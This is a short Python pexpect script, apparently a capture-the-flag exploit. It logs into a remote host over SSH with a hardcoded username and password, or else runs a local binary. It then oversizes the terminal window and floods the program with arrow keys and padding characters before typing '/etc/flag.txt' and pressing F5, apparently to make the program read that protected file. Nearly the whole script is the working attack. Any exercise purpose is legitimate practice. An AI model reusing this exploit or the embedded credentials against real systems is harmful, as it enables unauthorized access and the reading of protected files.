#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.
import pexpect 
import sys

F2   = "\x1bOQ"
F3   = "\x1bOR"
F4   = "\x1bOS"
F5   = "\x1b[15~"
F10  = "\x1b[21~"

DELE = "\x7f"

END  = "\x1bOF"

UP   = "\x1bOA"
DOWN = "\x1bOB"
RIGH = "\x1bOC"
LEFT = "\x1bOD"

local = int(sys.argv[1])

if local:
    cn =  pexpect.spawn("./bin")
else:
    cn = pexpect.spawn("ssh tolstoy@64.227.123.153")
    cn.expect("password:")
    cn.sendline("W&P1867")

cn.setwinsize(505, 500)
cn.send(DOWN * 501)
cn.send("a" * 28)
cn.send("/etc/flag.txt")
cn.send(F5)

cn.interact()

